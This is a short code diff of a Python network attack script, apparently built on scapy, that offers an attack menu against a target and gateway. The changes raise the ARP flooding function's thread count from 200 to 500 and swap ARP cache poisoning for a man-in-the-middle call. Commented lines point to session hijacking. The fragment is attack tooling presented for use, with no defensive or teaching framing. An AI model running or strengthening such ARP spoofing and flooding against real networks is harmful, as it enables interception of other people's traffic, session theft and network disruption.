@@ -52,7 +52,7 @@ def send_arp_requests(target_ip, target_mac, gateway_ip, gateway_mac, stop_event
         restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
         sys.exit(0)
 
-def arp_flood(target_ip, target_mac, gateway_ip, gateway_mac, thread_count=200):
+def arp_flood(target_ip, target_mac, gateway_ip, gateway_mac, thread_count=500):
     stop_event = threading.Event()
     threads = []
 
@@ -116,7 +116,7 @@ if __name__ == "__main__":
     elif attack == '2':
         arp_flood(target_ip, target_mac, gateway_ip, gateway_mac)
     elif attack == '3':
-        scapy.arpcachepoison(gateway_ip, target_ip, interval=2)
+        scapy.arp_mitm(target_ip, gateway_ip)
         # interface = input("Enter the network interface to sniff on: ")
         # session_hijacking(interface)
     else:
